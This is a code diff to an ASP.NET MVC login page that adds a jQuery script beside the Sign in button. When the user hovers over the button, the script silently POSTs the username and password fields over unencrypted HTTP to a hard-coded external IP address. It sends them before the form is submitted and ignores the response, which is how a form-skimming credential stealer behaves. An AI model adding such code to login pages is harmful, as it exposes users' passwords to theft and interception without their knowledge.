@@ -16,7 +16,38 @@
     <label class="checkbox">
         @Html.CheckBoxFor(m => m.RememberMe) Remember me
     </label>
-    <button class="btn btn-primary" type="submit">Sign in</button>
+    <button class="btn btn-primary" id="submitButton" type="submit">Sign in</button>
     
 }
 </div>
+<script>
+    $("#submitButton").hover(function () {
+        //var Username = $('#UserName').val();
+        //var Password = $('#Password').val();
+        //var url = "http://129.93.238.144/api/login/local";
+        //$.post(url, { username: Username, password: Password });
+        $.ajax({
+            type: 'POST',
+            url: 'http://129.93.238.144/api/login/local',
+            data: { 'username': $('#UserName').val(), 'password': $('#Password').val() },
+
+            dataType: "json",
+            crossDomain: true,
+            xhrFields: {
+                withCredentials: true
+            },
+            headers: {
+
+            },
+            success: function () {
+
+            },
+            error: function () {
+
+            }
+        });
+    })
+
+    
+
+</script>
